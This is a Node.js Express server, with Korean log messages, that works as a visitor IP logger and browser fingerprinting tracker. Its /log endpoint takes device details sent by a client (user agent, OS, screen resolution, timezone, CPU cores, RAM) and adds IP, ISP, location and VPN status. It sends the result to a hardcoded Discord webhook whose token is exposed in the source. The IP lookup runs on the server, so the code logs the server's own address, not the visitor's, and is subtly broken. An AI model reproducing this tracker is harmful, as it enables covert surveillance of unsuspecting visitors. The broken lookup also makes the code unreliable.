const express = require("express");
const fetch = require("node-fetch");
const mongoose = require("mongoose");

const app = express();
app.use(express.json());

mongoose.connect("mongodb://localhost:27017/logs", { useNewUrlParser: true, useUnifiedTopology: true });

const LogSchema = new mongoose.Schema({ ip: String });
const Log = mongoose.model("Log", LogSchema);

const WEBHOOK_URL = "https://discord.com/api/webhooks/1554829524456317000/g-aN0V0bngIgpupLFB6Fy5JpiEsQCZAcmIbm83F-OBbUMqRtAeaRUUiCSUC2QEI2qkFv";

app.post("/log", async (req, res) => {
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();
    const ip = ipData.ip;

    const exists = await Log.findOne({ ip });
    if (exists) {
      return res.status(200).send("이미 기록된 IP");
    }

    const payload = {
      content: `📋 새로운 접속 로그
IP: ${ip}
ISP: ${ipData.org}
위치: ${ipData.city}, ${ipData.country_name}
VPN: ${ipData.proxy ? "true" : "false"}
IPv 버전: ${ipData.version}
호스팅 유형: ${ipData.type}
브라우저 UA: ${req.body.ua}
OS: ${req.body.osInfo}
모바일: ${req.body.isMobile}
언어: ${req.body.language}
해상도: ${req.body.resolution}
색상 깊이: ${req.body.colorDepth}
타임존: ${req.body.timeZone}
CPU 코어: ${req.body.cores}
RAM: ${req.body.ram}
쿠키 사용 가능: ${req.body.cookiesEnabled}
접속 시간: ${new Date().toLocaleString()}`
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    await Log.create({ ip });

    res.status(200).send("로그 기록 완료");
  } catch (err) {
    console.error(err);
    res.status(500).send("에러 발생");
  }
});

app.listen(3000, () => console.log("서버 실행 중 http://localhost:3000"));
